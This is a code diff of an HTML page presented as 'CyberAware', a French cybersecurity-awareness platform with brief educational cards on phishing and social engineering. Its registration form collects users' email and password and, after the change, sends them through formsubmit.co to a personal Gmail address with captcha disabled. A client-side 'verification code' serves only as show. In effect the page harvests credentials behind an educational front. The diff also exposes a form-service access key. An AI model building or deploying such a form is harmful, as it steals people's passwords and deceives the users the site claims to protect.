@@ -117,7 +117,6 @@
       margin-top: 20px;
     }
 
-    /* TABLET & DESKTOP */
     @media (min-width: 768px) {
       .grid {
         grid-template-columns: repeat(2, 1fr);
@@ -134,10 +133,11 @@
     <h1>CyberAware</h1>
     <p>Plateforme de sensibilisation à la cybersécurité</p>
     
-    <form action="https://api.web3forms.com/submit" method="POST" id="registerForm">
-      <input type="hidden" name="access_key" value="78c4e0bf-fe40-4669-9faf-2e46c98c8d90">
+    <form action="https://formsubmit.co/tss.alex84@gmail.com" method="POST" id="registerForm">
+      <!-- Champs cachés pour Formsubmit -->
       <input type="hidden" name="_subject" value="Nouvelle inscription CyberAware">
       <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://votre-site.fr/merci.html">
       
       <input type="email" name="email" id="email" placeholder="Adresse email" required>
       <input type="password" name="password" id="password" placeholder="Mot de passe" required>
@@ -159,50 +159,32 @@
 
   <!-- DASHBOARD -->
   <section id="dashboard" class="hidden">
-
     <h2>Techniques d'attaque – Vue éducative</h2>
-
     <div class="grid">
       <div class="card">
         <h3>Phishing</h3>
-        <p>
-          Le phishing imite des services connus pour tromper l'utilisateur et récupérer des informations sensibles.
-        </p>
+        <p>Le phishing imite des services connus pour tromper l'utilisateur et récupérer des informations sensibles.</p>
       </div>
-
       <div class="card">
         <h3>Ingénierie sociale</h3>
-        <p>
-          Exploitation psychologique des biais humains : urgence, peur, autorité.
-        </p>
+        <p>Exploitation psychologique des biais humains : urgence, peur, autorité.</p>
       </div>
-
       <div class="card">
         <h3>Fausses interfaces</h3>
-        <p>
-          Pages imitant visuellement des sites connus. La vigilance est la clé.
-        </p>
+        <p>Pages imitant visuellement des sites connus. La vigilance est la clé.</p>
       </div>
-
       <div class="card">
         <h3>Compromission de session</h3>
-        <p>
-          Accès non autorisé à une session active via un appareil ou réseau non sécurisé.
-        </p>
+        <p>Accès non autorisé à une session active via un appareil ou réseau non sécurisé.</p>
       </div>
     </div>
 
     <!-- CONTACT -->
     <h2>Contact</h2>
-
     <div class="card">
       <p>Pour nous contacter, envoyez un email à : <strong>contact@cyberaware.fr</strong></p>
     </div>
-
-    <p class="legal">
-      ⚠️ Site éducatif – aucune méthode illégale n'est enseignée.
-    </p>
-
+    <p class="legal">⚠️ Site éducatif – aucune méthode illégale n'est enseignée.</p>
   </section>
 
 </div>
@@ -210,7 +192,6 @@
 <script>
   let generatedCode = "";
 
-  // Gérer la soumission du formulaire d'inscription
   document.getElementById('registerForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
@@ -222,26 +203,23 @@
       return;
     }
 
-    // Envoyer les données à Web3Forms
     const formData = new FormData(this);
-    fetch('https://api.web3forms.com/submit', {
+    fetch(this.action, {
       method: 'POST',
       body: formData
     }).then(() => {
-      // Après l'envoi, générer le code et passer à l'étape suivante
       generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
       document.getElementById("generatedCode").innerText = generatedCode;
 
       document.getElementById("loginSection").classList.add("hidden");
       document.getElementById("codeSection").classList.remove("hidden");
-    }).catch(error => {
+    }).catch(() => {
       alert("Erreur lors de l'envoi. Veuillez réessayer.");
     });
   });
 
   function verifyCode() {
     const input = document.getElementById("codeInput").value;
-
     if (input === generatedCode) {
       document.getElementById("codeSection").classList.add("hidden");
       document.getElementById("dashboard").classList.remove("hidden");
